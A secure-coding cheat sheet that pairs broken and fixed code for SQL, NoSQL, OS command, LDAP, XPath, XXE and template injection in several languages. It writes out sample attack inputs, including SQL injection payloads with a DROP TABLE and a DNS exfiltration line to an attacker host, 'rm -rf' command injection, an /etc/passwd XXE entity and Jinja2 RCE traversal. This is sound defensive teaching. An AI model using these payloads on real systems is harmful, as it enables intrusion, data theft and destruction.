# OWASP Injection Prevention

Defenses for SQL, NoSQL, OS command, LDAP, XPath, XXE, SSTI, SSRF, XSS, CSV, header, mail, log, and code injection across Python, Go, Node, Ruby, Java, Rust, PHP — broken-then-fixed pairs for every common stack.

## Setup

Injection happens when an interpreter — SQL engine, OS shell, LDAP server, XML parser, template engine, browser DOM — mistakes attacker-supplied data for code. The interpreter executes the attacker's intent because the boundary between data and instructions was never enforced.

OWASP ranks injection #3 in the OWASP Top 10 (2021). It used to be #1 for over a decade. Even after a decade of awareness, it persists because every new framework, every new datastore, every new template engine reinvents the boundary, and every reinvention is a chance to get it wrong.

The universal rule: **parameterize at the boundary, encode at output**. Never build interpreter input by concatenating user data into a string. Use the parameterization API the interpreter provides (prepared statements, argument arrays, bound variables). When you must produce a string for a different interpreter (HTML, URL, JSON), encode for that target's syntax.

Three lines that summarize this entire sheet:

```bash
# Broken — string concatenation passes user data as code
db.execute("SELECT * FROM users WHERE name='" + user + "'")

# Fixed — parameterization tells the engine "this is data"
db.execute("SELECT * FROM users WHERE name=?", (user,))
```

Read every section as: here is the broken pattern that ships in production code; here is the fix; here is the one-line explanation of why the fix works.

## Threat Taxonomy

The injection family by interpreter:

```bash
SQL injection           — SQL engine (Postgres, MySQL, SQLite, Oracle, MSSQL)
NoSQL injection         — Mongo $where, Redis EVAL, CouchDB Mango operators
OS command injection    — /bin/sh, cmd.exe, powershell.exe via system()/exec()
LDAP injection          — directory server filter language
XPath injection         — XML query engine
XML / XXE injection     — XML parser entity resolution + DTD
SSTI                    — server-side template engines (Jinja2, ERB, Twig, Handlebars, Velocity, Thymeleaf)
SSRF                    — HTTP client makes attacker-controlled outbound request
XSS                     — browser HTML/JS interpreter (output-side, but injected from input)
CSV / Formula injection — spreadsheet apps interpret =/+/-/@ as formulas
Header injection (CRLF) — HTTP header parser interprets \r\n
Log injection           — log search/parsing tools interpret embedded markers
Mail header injection   — SMTP server interprets injected To/Cc/Bcc/Subject
Code injection          — eval/exec/Function/pickle.load — full RCE
```

Every interpreter has its own escape rules. The universal answer is "don't escape — parameterize." When parameterization is impossible (table names, ORDER BY columns), use an allowlist mapping from user input to a fixed set of known-safe values.

## SQL Injection — Python sqlite3

```python
# Broken — f-string interpolation puts user data into the SQL text
import sqlite3
conn = sqlite3.connect("app.db")
name = request.args["name"]
cur = conn.execute(f"SELECT id FROM users WHERE name='{name}'")
# Attacker submits: ' OR 1=1 -- → returns every user row
```

```python
# Fixed — ? placeholder with tuple of bound parameters
import sqlite3
conn = sqlite3.connect("app.db")
name = request.args["name"]
cur = conn.execute("SELECT id FROM users WHERE name = ?", (name,))
# The driver sends the SQL and the parameter separately;
# the database knows the parameter is data, not code.
```

The single-element tuple `(name,)` matters — `(name)` is just parens around a string, not a tuple. sqlite3 raises `ProgrammingError: parameters are of unsupported type` on that mistake.

## SQL Injection — Python psycopg2

```python
# Broken — % string formatting at the Python level
import psycopg2
conn = psycopg2.connect(dsn)
cur = conn.cursor()
cur.execute("SELECT * FROM products WHERE sku = '%s'" % sku)
# Same as f-string — the SQL string already contains the user data.
```

```python
# Fixed — %s placeholder with separate parameter tuple
import psycopg2
conn = psycopg2.connect(dsn)
cur = conn.cursor()
cur.execute("SELECT * FROM products WHERE sku = %s", (sku,))
# psycopg2 uses %s as its placeholder syntax (not Python's % formatting).
# The driver substitutes the value with proper escaping/typing.
```

Driver placeholder cheat-sheet across Python:

```bash
sqlite3      → ?
psycopg2     → %s
psycopg3     → %s (also supports %(name)s named)
mysqlclient  → %s
PyMySQL      → %s
oracledb     → :name (named) or :1, :2 (numeric)
pyodbc       → ?
```

The `?` vs `%s` confusion is the #1 reason developers fall back to f-strings — they swap drivers and the placeholder syntax changed. Always check the driver docs; never paper over it with format strings.

## SQL Injection — Python SQLAlchemy

```python
# Broken — text() with f-string is just a string concat with extra steps
from sqlalchemy import text
result = conn.execute(text(f"SELECT * FROM orders WHERE id = {order_id}"))
```

```python
# Fixed — bound parameters via :name placeholders
from sqlalchemy import text
stmt = text("SELECT * FROM orders WHERE id = :id").bindparams(id=order_id)
result = conn.execute(stmt)
```

```python
# Fixed — ORM API, no raw SQL
from sqlalchemy.orm import Session
session = Session(engine)
order = session.query(Order).filter(Order.id == order_id).one()
# Or in 2.x style:
from sqlalchemy import select
stmt = select(Order).where(Order.id == order_id)
order = session.execute(stmt).scalar_one()
```

The ORM filter API generates parameterized SQL; the only escape hatch where you can hurt yourself is `text()`, `.execute()` with raw strings, and `.filter(text(...))` with concatenation. Treat every `text(f"...")` as a defect.

## SQL Injection — Go database/sql

```go
// Broken — fmt.Sprintf builds SQL text from user input
import "fmt"
import "database/sql"

q := fmt.Sprintf("SELECT id FROM users WHERE email = '%s'", email)
rows, err := db.Query(q)
```

```go
// Fixed — placeholder + variadic argument list
import "database/sql"

rows, err := db.Query("SELECT id FROM users WHERE email = $1", email)
defer rows.Close()
// Or use Prepare for repeated execution:
stmt, err := db.Prepare("SELECT id FROM users WHERE email = $1")
defer stmt.Close()
rows, err := stmt.Query(email)
```

Driver placeholder syntax in Go varies:

```bash
github.com/lib/pq               → $1, $2, $3
github.com/jackc/pgx/v5         → $1, $2, $3
github.com/go-sql-driver/mysql  → ?, ?, ?
modernc.org/sqlite              → ?, ? or ?1, ?2
github.com/microsoft/go-mssqldb → @p1, @p2 or ?
github.com/godror/godror        → :1, :2 (Oracle)
```

When you write portable code, use the `Rebind` helper from `sqlx`:

```go
// Fixed — sqlx normalizes ? to the driver's syntax
import "github.com/jmoiron/sqlx"

q := db.Rebind("SELECT id FROM users WHERE email = ?")
rows, err := db.Queryx(q, email)
```

`Rebind` walks the query and rewrites `?` to whatever the driver expects — `$1`, `:1`, `@p1`. It does not parse strings, so embedded `?` inside literal text breaks it; another reason to never embed user data.

## SQL Injection — Java JDBC

```java
// Broken — concatenation into a Statement
import java.sql.*;

Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(
    "SELECT * FROM accounts WHERE owner = '" + userName + "'"
);
```

```java
// Fixed — PreparedStatement with typed setters
import java.sql.*;

PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM accounts WHERE owner = ? AND balance > ?"
);
ps.setString(1, userName);
ps.setBigDecimal(2, minBalance);
ResultSet rs = ps.executeQuery();
```

Use `setString`, `setInt`, `setLong`, `setBigDecimal`, `setTimestamp`, `setBoolean`, `setBytes` — never `setObject` if you can avoid it (it picks a type and the binding may not match the column).

JPA / Hibernate equivalents:

```java
// Broken — JPQL concat
String jpql = "FROM Account a WHERE a.owner = '" + userName + "'";
List<Account> result = em.createQuery(jpql, Account.class).getResultList();
```

```java
// Fixed — named parameters
TypedQuery<Account> q = em.createQuery(
    "FROM Account a WHERE a.owner = :owner", Account.class);
q.setParameter("owner", userName);
List<Account> result = q.getResultList();
```

Never use `createNativeQuery` with concatenated strings; if you need native SQL, use `?1`, `?2` or `:name` placeholders and call `setParameter`.

## SQL Injection — Ruby Active Record

```ruby
# Broken — string interpolation in where()
Article.where("title = '#{params[:name]}'")
# Active Record literally concatenates this into the SQL.
```

```ruby
# Fixed — hash form (safest)
Article.where(title: params[:name])

# Fixed — placeholder array form (when you need operators or OR)
Article.where("title = ?", params[:name])
Article.where("title LIKE ?", "%#{params[:name]}%")  # interpolation here is in
                                                     # the placeholder VALUE,
                                                     # not the SQL fragment

# Fixed — named placeholders for clarity
Article.where("title = :name AND author = :author",
              name: params[:name], author: params[:author])
```

```ruby
# Fixed — sanitize_sql when you must build a fragment
fragment = ActiveRecord::Base.sanitize_sql(["title = ?", params[:name]])
Article.where(fragment)
```

The Rails docs literally label string-interpolation `where` calls as "SQL injection" in their guide — but the pattern is still common in legacy codebases. Audit every `where("...#{...}...")` as a defect.

## SQL Injection — Ruby pg

```ruby
# Broken — concatenation
require "pg"
conn = PG.connect(dbname: "app")
conn.exec("SELECT * FROM users WHERE name = '" + name + "'")
```

```ruby
# Fixed — exec_params with $1/$2 numbered placeholders
require "pg"
conn = PG.connect(dbname: "app")
res = conn.exec_params("SELECT * FROM users WHERE name = $1", [name])
res.each do |row|
  puts row["id"]
end
```

`exec_params` is the only safe entry point — `exec` accepts plain SQL, no parameters. `prepare` + `exec_prepared` is also safe and faster for repeated calls.

## SQL Injection — Node pg

```javascript
// Broken — template literal embeds user data
const { Pool } = require("pg");
const pool = new Pool();

const { rows } = await pool.query(
  `SELECT * FROM users WHERE email = '${req.body.email}'`
);
```

```javascript
// Fixed — $1/$2 placeholders + array of values
const { Pool } = require("pg");
const pool = new Pool();

const { rows } = await pool.query(
  "SELECT * FROM users WHERE email = $1",
  [req.body.email]
);
```

The values array is sent over the wire as the typed extended-query protocol — the database parses the SQL once, then binds values. No string substitution happens client-side.

## SQL Injection — Node mysql2

```javascript
// Broken — mysql.format with values inside the SQL string is still concat
const mysql = require("mysql2/promise");
const conn = await mysql.createConnection({ /* ... */ });

const sql = `SELECT * FROM products WHERE sku = '${sku}'`;
const [rows] = await conn.execute(sql);
```

```javascript
// Fixed — execute with ? placeholders + array (uses prepared statements)
const mysql = require("mysql2/promise");
const pool = mysql.createPool({ /* ... */ });

const [rows] = await pool.execute(
  "SELECT * FROM products WHERE sku = ?",
  [sku]
);
```

Note `pool.execute` (prepared statement) is safer than `pool.query` (which can do client-side `?` substitution that escapes but stays in the string). Prefer `execute`.

## SQL Injection — PHP PDO

```php
// Broken — concatenation
<?php
$pdo = new PDO("pgsql:host=localhost;dbname=app", "u", "p");
$stmt = $pdo->query("SELECT * FROM users WHERE name = '" . $_GET["name"] . "'");
```

```php
// Fixed — prepare + bindValue with explicit type
<?php
$pdo = new PDO("pgsql:host=localhost;dbname=app", "u", "p", [
  PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
  PDO::ATTR_EMULATE_PREPARES => false,  // force real prepared statements
]);
$stmt = $pdo->prepare("SELECT * FROM users WHERE name = :name AND age >= :age");
$stmt->bindValue(":name", $_GET["name"], PDO::PARAM_STR);
$stmt->bindValue(":age", (int)$_GET["age"], PDO::PARAM_INT);
$stmt->execute();
$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
```

`PDO::ATTR_EMULATE_PREPARES => false` is critical — when it's `true` (the historical default for MySQL), PDO does string substitution client-side. While the substitution is escape-aware, you lose typing. Disable emulation, get real server-side prepared statements.

## SQL Injection — Rust sqlx

```rust
// Broken — format! into a query string
let q = format!("SELECT * FROM users WHERE email = '{}'", email);
let rows = sqlx::query(&q).fetch_all(&pool).await?;
```

```rust
// Fixed — query! macro: compile-time-checks SQL against the database schema
let rows = sqlx::query!(
    "SELECT id, email FROM users WHERE email = $1",
    email
).fetch_all(&pool).await?;

// query_as! for typed rows
#[derive(sqlx::FromRow)]
struct User { id: i64, email: String }
let users = sqlx::query_as!(User,
    "SELECT id, email FROM users WHERE email = $1",
    email
).fetch_all(&pool).await?;

// Runtime API when you need dynamic queries
let rows = sqlx::query("SELECT * FROM users WHERE email = $1")
    .bind(email)
    .fetch_all(&pool).await?;
```

The compile-time-checked macros require `DATABASE_URL` set during compilation (or a cached schema in `.sqlx/`). The macro literally connects to your database, prepares the query, and verifies the column types match the destination Rust types.

## SQL Injection — Identifier Handling

Table and column names cannot be parameterized. Placeholders bind values, not identifiers. So this fails:

```python
# Broken — placeholder cannot bind a table name
cur.execute("SELECT * FROM ? WHERE id = ?", (table, row_id))
# sqlite3.OperationalError: near "?": syntax error
```

```python
# Fixed — allowlist mapping from user input to a fixed set of known names
ALLOWED_TABLES = {"users", "orders", "products"}

def fetch(table: str, row_id: int):
    if table not in ALLOWED_TABLES:
        raise ValueError(f"unknown table: {table}")
    # f-string is now safe because `table` is provably one of three constants
    return cur.execute(f"SELECT * FROM {table} WHERE id = ?", (row_id,))
```

Same pattern for column names — never trust the column name from a request; map it to a fixed list. If the user can pick from 200 columns, build an allowlist of 200 entries.

```python
ALLOWED_COLUMNS = {"name", "email", "created_at", "status"}

def order_by(col: str):
    if col not in ALLOWED_COLUMNS:
        raise ValueError("invalid sort column")
    return f"ORDER BY {col}"
```

If the database supports it, use the engine's quoting helper — `psycopg.sql.Identifier`, `pg.escapeIdentifier` — but allowlisting is still required because quoting just prevents syntax breakage, not unauthorized access to a hidden column.

## SQL Injection — ORDER BY / LIMIT

`ORDER BY column` and `ORDER BY direction` are identifiers — same allowlist rule.

```go
// Broken — user picks any column and direction
q := fmt.Sprintf("SELECT * FROM users ORDER BY %s %s", col, dir)
```

```go
// Fixed — allowlist the column and direction separately
allowedCols := map[string]bool{"name": true, "created_at": true}
allowedDir := map[string]string{"asc": "ASC", "desc": "DESC"}

if !allowedCols[col] {
    return errors.New("invalid sort column")
}
sortDir, ok := allowedDir[strings.ToLower(dir)]
if !ok {
    return errors.New("invalid sort direction")
}
q := fmt.Sprintf("SELECT * FROM users ORDER BY %s %s LIMIT $1", col, sortDir)
rows, err := db.Query(q, limit)
```

`LIMIT` and `OFFSET` are values, so they parameterize — but be defensive about the type. The integer-cast trick:

```python
# Fixed — coerce to int and bound the upper limit
try:
    limit = max(1, min(int(request.args["limit"]), 1000))
except (ValueError, TypeError):
    limit = 100
cur.execute("SELECT * FROM users LIMIT ?", (limit,))
```

A non-numeric `limit` would otherwise produce a database error that leaks structure to the attacker.

## SQL Injection — Stored Procedures

A stored procedure is **not automatically safe**. If the procedure body concatenates SQL inside, the injection surface moved from app code to the database — same vulnerability, harder to audit.

```sql
-- Broken stored procedure — internal concatenation
CREATE PROCEDURE search_users(name TEXT) AS $$
DECLARE
  q TEXT;
BEGIN
  q := 'SELECT * FROM users WHERE name = ''' || name || '''';
  EXECUTE q;
END;
$$ LANGUAGE plpgsql;
```

```sql
-- Fixed — EXECUTE ... USING binds parameters
CREATE PROCEDURE search_users(IN name TEXT) AS $$
BEGIN
  EXECUTE 'SELECT * FROM users WHERE name = $1' USING name;
END;
$$ LANGUAGE plpgsql;

-- Or even simpler — direct query, no dynamic SQL
CREATE PROCEDURE search_users(IN name TEXT) AS $$
BEGIN
  PERFORM * FROM users WHERE name = search_users.name;
END;
$$ LANGUAGE plpgsql;
```

T-SQL `sp_executesql` with parameter list, MySQL prepared statements with `PREPARE ... EXECUTE USING`, and Oracle `EXECUTE IMMEDIATE ... USING` are the parameterized forms. `EXEC @sql` and `EXECUTE IMMEDIATE @sql` without `USING` are concatenation.

## SQL Injection — UNION / Boolean / Time-based Blind

What an attacker actually does:

```bash
# UNION-based — extract data from arbitrary tables
?id=1 UNION SELECT username, password FROM admin_users--

# Information schema enumeration
?id=1 UNION SELECT table_name, NULL FROM information_schema.tables--

# Boolean-based blind — server returns different content for true vs false
?id=1 AND 1=1   → normal page
?id=1 AND 1=2   → empty page
?id=1 AND (SELECT SUBSTR(password,1,1) FROM users WHERE id=1)='a'

# Time-based blind — server delays when condition is true
?id=1; SELECT pg_sleep(5)--
?id=1 AND IF(SUBSTR(password,1,1)='a', SLEEP(5), 0)
?id=1; WAITFOR DELAY '0:0:5'--   -- MSSQL

# Stacked queries (driver-dependent — many drivers reject multi-statement)
?id=1; DROP TABLE users--

# Out-of-band exfiltration via DNS lookups
?id=1 UNION SELECT LOAD_FILE(CONCAT('\\\\', password, '.attacker.com\\x'))
```

Defense: parameterize. The above all hinge on the attacker controlling the SQL string. Parameterized queries reduce them all to "the database treats it as a literal value."

## NoSQL Injection — MongoDB

```javascript
// Broken — passing req.body directly to a Mongo query
// User submits: { "username": "admin", "password": { "$ne": null } }
// → matches any admin record because $ne null matches any non-null password
const user = await db.collection("users").findOne(req.body);
```

```javascript
// Fixed — extract typed scalars; never pass an object straight through
const username = String(req.body.username || "");
const password = String(req.body.password || "");
const user = await db.collection("users").findOne({
  username: username,
  password: password,
});
```

The Express `body-parser` middleware deserializes JSON into JavaScript objects — `req.body.password` can be a string OR an object. If you don't coerce to a primitive, the user can substitute query operators (`$ne`, `$gt`, `$regex`, `$where`) that change the query's semantics.

```javascript
// Broken — $where executes server-side JavaScript with user data
db.users.find({ $where: `this.username == '${user}'` });
// User submits: ' || (function(){while(1){}})()    → Mongo runs an infinite loop

// Fixed — never use $where with user input. Use typed fields.
db.users.find({ username: user });
```

`$where` is JavaScript eval inside the database; it must never receive user data. Disable it at the cluster level: `--noscripting` on `mongod`, or `enableLocalhost: false` in modern config.

## OS Command Injection — Python

```python
# Broken — shell=True with concatenation
import subprocess
filename = request.args["file"]
subprocess.run(f"cat {filename}", shell=True, check=True)
# User submits: foo.txt; rm -rf ~  → both commands execute
```

```python
# Fixed — list args + shell=False (the default)
import subprocess
filename = request.args["file"]
subprocess.run(["cat", filename], check=True)
# /bin/cat is invoked directly with `filename` as a literal argument vector;
# no shell parsing means `;`, `|`, `&`, backticks have no special meaning.
```

Why `shell=False` is safe: the OS `execve(2)` call takes an argv array, not a string. The shell is the thing that parses metacharacters; bypass the shell, bypass the parsing.

## OS Command Injection — Python pitfall

```python
# Broken — shlex.split on user input is NOT a safe escape
import shlex, subprocess
args = shlex.split(request.args["cmd"])
subprocess.run(args)
# User submits: rm -rf /  → shlex.split returns ["rm", "-rf", "/"]
# subprocess.run executes it. shlex.split is a parser, not a sandbox.
```

`shlex.split` is for parsing trusted strings (config files, dev shortcuts) into argv. It does not validate that the resulting command is safe — it just tokenizes. Never use it on attacker input.

```python
# Fixed — argv list with attacker data only as a single argument
subprocess.run(["grep", request.args["pattern"], "/var/log/app.log"])
```

## OS Command Injection — Go

```go
// Broken — sh -c with concatenation
import "os/exec"
out, err := exec.Command("sh", "-c", "cat " + filename).Output()
```

```go
// Fixed — direct exec, no shell
import "os/exec"
out, err := exec.Command("cat", filename).Output()
// Or with explicit context for cancellation:
import "context"
ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
defer cancel()
out, err := exec.CommandContext(ctx, "cat", filename).Output()
```

`exec.Command` does no shell expansion — the `*` in `*.txt` will not glob, environment variables won't expand. If you need that, you do it explicitly with Go code (e.g. `filepath.Glob`).

## OS Command Injection — Node

```javascript
// Broken — child_process.exec uses /bin/sh -c
const { exec } = require("child_process");
exec(`grep ${pattern} app.log`, (err, stdout) => { /* ... */ });
```

```javascript
// Fixed — execFile (no shell) or spawn with array args
const { execFile, spawn } = require("child_process");

execFile("grep", [pattern, "app.log"], (err, stdout) => { /* ... */ });

// Or spawn with stdio piped
const child = spawn("grep", [pattern, "app.log"]);
child.stdout.on("data", chunk => { /* ... */ });
```

Promise versions:

```javascript
const { execFile } = require("child_process/promises");  // Node 15+
const { stdout } = await execFile("grep", [pattern, "app.log"]);
```

`exec` is a thin wrapper around `spawn("/bin/sh", ["-c", cmd])`. Even if you escape, you're escaping for the shell — and shell quoting rules are notoriously hard to get right across platforms (cmd.exe quoting differs from POSIX).

## OS Command Injection — Ruby

```ruby
# Broken — Kernel#system with interpolation
system("grep #{pattern} app.log")
# Same with backticks and %x{}:
result = `grep #{pattern} app.log`
result = %x{grep #{pattern} app.log}
```

```ruby
# Fixed — system with separate args (no shell)
system("grep", pattern, "app.log")

# Fixed — Open3.capture3 returns stdout, stderr, status
require "open3"
stdout, stderr, status = Open3.capture3("grep", pattern, "app.log")
```

The signature `system("a", "b", "c")` invokes `a` with argv `["b", "c"]`. The signature `system("a b c")` invokes `/bin/sh -c "a b c"`. The first form is safe; the second is a shell.

`IO.popen` follows the same rule — pass an array to skip the shell.

## OS Command Injection — Rust std::process::Command

```rust
// Rust's Command never invokes a shell unless you ask for one.
use std::process::Command;
let out = Command::new("grep")
    .arg(&pattern)
    .arg("app.log")
    .output()?;
```

The struct's contract is "argv vector" — you cannot pass a single string and accidentally invoke a shell. To get shell behaviour you must explicitly do `Command::new("sh").arg("-c").arg(cmd)`, at which point you've opted into the danger.

## OS Command Injection — Java ProcessBuilder

```java
// Broken — Runtime.exec(String) tokenizes on whitespace and is dangerous
Runtime.getRuntime().exec("grep " + pattern + " app.log");
// User submits: foo app.log; rm -rf ~  — well, Runtime.exec(String) doesn't
// actually invoke a shell, but the StringTokenizer splits on whitespace,
// breaking quoting, and behaviour is platform-dependent. Avoid.
```

```java
// Fixed — Runtime.exec(String[]) or ProcessBuilder
Process p = Runtime.getRuntime().exec(new String[]{"grep", pattern, "app.log"});

// Fixed — ProcessBuilder is the modern API
ProcessBuilder pb = new ProcessBuilder("grep", pattern, "app.log");
pb.redirectErrorStream(true);
Process p = pb.start();
String output = new String(p.getInputStream().readAllBytes());
```

`Runtime.exec(String)` is an antipattern even without injection — its tokenization can't handle quoted spaces, environment variables, or escapes. Always pass `String[]` or use `ProcessBuilder`.

## OS Command Injection — File Path Injection

User-controlled file paths can escape an intended directory via `..`, absolute paths, or symlinks.

```python
# Broken — joining without validation
import os
base = "/var/uploads"
target = os.path.join(base, request.args["file"])
open(target).read()
# User submits: ../../etc/passwd  → reads /etc/passwd
```

```python
# Fixed — pathlib resolve + parent check
from pathlib import Path
base = Path("/var/uploads").resolve()
target = (base / request.args["file"]).resolve()
if not target.is_relative_to(base):  # Python 3.9+
    raise ValueError("path escape")
data = target.read_text()
```

```go
// Fixed — filepath.Clean + prefix check
import "path/filepath"
import "strings"

base := "/var/uploads"
target := filepath.Clean(filepath.Join(base, name))
if !strings.HasPrefix(target, base+string(filepath.Separator)) {
    return errors.New("path escape")
}
```

```go
// Fixed — Go 1.21+ filepath.IsLocal validates "no escape, no absolute path"
if !filepath.IsLocal(name) {
    return errors.New("invalid path")
}
target := filepath.Join(base, name)
```

```python
# Fixed — Python 3.13+ Path.full_match for stricter checks
target = (base / name).resolve(strict=True)
if not target.is_relative_to(base):
    raise ValueError("path escape")
```

`resolve()` is critical — it canonicalizes symlinks. Without it, attacker can plant a symlink in the upload dir that points outside.

## LDAP Injection — Python ldap3

```python
# Broken — f-string filter
import ldap3
server = ldap3.Server("ldap://ds.example.com")
conn = ldap3.Connection(server)
conn.bind()
conn.search(
    "ou=users,dc=example,dc=com",
    f"(uid={username})",
)
# User submits: *)(uid=*  → filter becomes (uid=*)(uid=*) returning all users.
# Or: admin)(|(uid=*    → (uid=admin)(|(uid=*) returning admin + all
```

```python
# Fixed — escape_filter_chars from ldap3.utils.conv
from ldap3.utils.conv import escape_filter_chars
safe_username = escape_filter_chars(username)
conn.search(
    "ou=users,dc=example,dc=com",
    f"(uid={safe_username})",
)
# escape_filter_chars escapes (, ), *, \, NUL per RFC 4515 §3 to \28, \29, etc.
```

The escape function handles the LDAP filter grammar. Don't roll your own — the rule covers more than the obvious metacharacters (notably backslash and NUL, which are non-printable and easy to miss).

## LDAP Injection — Java JNDI

```java
// Broken — concat
String filter = "(uid=" + username + ")";
NamingEnumeration<SearchResult> results =
    ctx.search("ou=users,dc=example,dc=com", filter, controls);
```

```java
// Fixed — OWASP Java Encoder for LDAP
import org.owasp.encoder.Encode;
String filter = "(uid=" + Encode.forLDAP(username) + ")";

// Fixed — JNDI prepared filter with arguments
String filter = "(uid={0})";
Object[] args = new Object[]{ username };
NamingEnumeration<SearchResult> results =
    ctx.search("ou=users,dc=example,dc=com", filter, args, controls);
```

The `{0}` placeholder + args form is JNDI's parameterized API; it escapes as required. The OWASP Java Encoder library is the same idea for cases where you build the filter string directly.

## LDAP Injection — distinguishedName escaping

DN escaping rules differ from filter escaping. Filter rules cover `( ) * \ NUL`. DN rules cover `, + " \ < > ; =` and leading/trailing spaces, plus `#` if leading.

```python
# Filter context
filter_value = escape_filter_chars(name)        # for (cn=value)

# DN context
from ldap3.utils.dn import escape_rdn
dn_value = escape_rdn(name)                     # for cn=value,ou=...
```

A name like `Smith, John` would become `Smith\2C John` in a DN — the `\2C` is the hex escape for comma. Use the library's DN escape; never paste filter-escape into a DN.

## XPath Injection

```python
# Broken — string concat into XPath
from lxml import etree
tree = etree.parse("users.xml")
result = tree.xpath(f"//user[name='{name}']/email")
# User submits: ' or '1'='1  → //user[name='' or '1'='1']/email returns all
```

```python
# Fixed — XPath variable binding
from lxml import etree
tree = etree.parse("users.xml")
result = tree.xpath("//user[name=$name]/email", name=name)
# lxml binds variables similarly to SQL parameters.
```

```java
// Java javax.xml.xpath
XPath xpath = XPathFactory.newInstance().newXPath();
xpath.setXPathVariableResolver(qname -> {
    if ("name".equals(qname.getLocalPart())) return name;
    return null;
});
NodeList nodes = (NodeList) xpath.evaluate(
    "//user[name=$name]/email", document, XPathConstants.NODESET);
```

When the engine doesn't support variables (older XPath 1.0 with no resolver), do the canonical "encode quote characters" — replace `'` with `&apos;` or split into XPath `concat()` of pieces. Migration to XPath 3.1 with `declare variable` is the cleaner long-term fix.

## XML / XXE — Python

```python
# Broken — default parsers expand external entities (CVE-class)
from xml.etree import ElementTree
tree = ElementTree.fromstring(user_xml)
# Attacker XML: <!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>
#               <foo>&x;</foo>
# Result: /etc/passwd contents in the parsed tree.
```

```python
# Fixed — defusedxml as a drop-in replacement
import defusedxml.ElementTree as ElementTree
tree = ElementTree.fromstring(user_xml)
# defusedxml refuses DOCTYPE and external entities by default.
```

```python
# Fixed — lxml configured to refuse entities + DTDs
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False,
    huge_tree=False,
)
tree = etree.fromstring(user_xml, parser)
```

The Python stdlib `xml.etree`, `xml.dom.minidom`, `xml.sax`, and `xml.dom.pulldom` all changed defaults over the years. As of Python 3.7+ external entity expansion is off in `xml.etree`, but `xml.dom` still parses DTDs. Use `defusedxml` and stop tracking which version is safe.

## XML / XXE — Java

```java
// Fixed — disable DOCTYPE on DocumentBuilderFactory
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.XMLConstants;

DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
dbf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");

DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(input);
```

```java
// Same hardening for SAXParser
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

```java
// Same hardening for XMLInputFactory (StAX)
XMLInputFactory xif = XMLInputFactory.newInstance();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty("javax.xml.stream.isSupportingExternalEntities", false);
```

The "disallow-doctype-decl" feature is the strongest single setting — it rejects any document that contains a `<!DOCTYPE>` declaration. If your business cares about DTD validation, you have a harder job (use a local catalog and explicit allowlist).

## XML / XXE — .NET

```csharp
// Fixed — XmlReaderSettings hardened
using System.Xml;
var settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null,
    MaxCharactersFromEntities = 1024,
};
using var reader = XmlReader.Create(stream, settings);
var doc = new XmlDocument { XmlResolver = null };
doc.Load(reader);
```

`DtdProcessing.Prohibit` rejects DTDs entirely. `XmlResolver = null` ensures any external resource references error rather than fetch. Modern .NET defaults are safer than .NET Framework 4.5- — pin both for cross-version code.

## XML / XXE — Node libxmljs

```javascript
// Fixed — explicit options to disable network, DTD, entity expansion
const libxmljs = require("libxmljs2");
const doc = libxmljs.parseXml(xmlString, {
  noent: false,         // do not expand entities (default false in libxmljs2)
  noblanks: true,
  recover: false,
  nonet: true,          // disable network access for entity loading
  dtdload: false,
  dtdvalid: false,
  dtdattr: false,
});
```

The "billion laughs" entity expansion bomb:

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;...">
]>
<lolz>&lol4;</lolz>
```

A 32KB document expands to gigabytes when entities are resolved. Defense: `noent: false` (don't expand), or set a hard limit on entity expansion (`MaxCharactersFromEntities` in .NET, `XML_PARSE_NOENT` off in libxml2).

## Server-Side Template Injection — Jinja2

The Jinja2 sandbox is **not a security boundary**. The docs say so. It exists to make template authoring slightly safer in trusted-template scenarios; not as defense against attacker-controlled templates.

```python
# Broken — render_template_string with user data as the template
from flask import Flask, render_template_string, request
app = Flask(__name__)

@app.route("/hi")
def hi():
    return render_template_string("Hello " + request.args["name"])
# User submits: name={{config.items()}}    → leaks Flask config (secrets!)
# Or:           name={{ ''.__class__.__mro__[1].__subclasses__() }}
#               → enumerates Python classes → finds Popen → RCE
```

```python
# Fixed — pass data into a fixed template, never compile user data as template
@app.route("/hi")
def hi():
    return render_template_string("Hello {{name}}", name=request.args["name"])
```

The class-traversal payload `''.__class__.__mro__[...]__subclasses__()` enumerates every subclass loaded in the interpreter, including `Popen` and `os.system` wrappers. Once you find `Popen`, you have RCE inside the Flask process.

Even the `SandboxedEnvironment` class explicitly warns: it raises on attribute access to `__` names, but bypasses exist (the `lipsum` global, `cycler`, `joiner` helpers in template globals each leak Python objects). Don't render user templates.

## Server-Side Template Injection — ERB

```ruby
# Broken — ERB.new with user data
require "erb"
ERB.new(params[:template]).result(binding)
# Equivalent to eval — full RCE.
```

```ruby
# Fixed — fixed template, locals are data
require "erb"
TEMPLATE = ERB.new("Hello <%= name %>")
TEMPLATE.result_with_hash(name: params[:name])
```

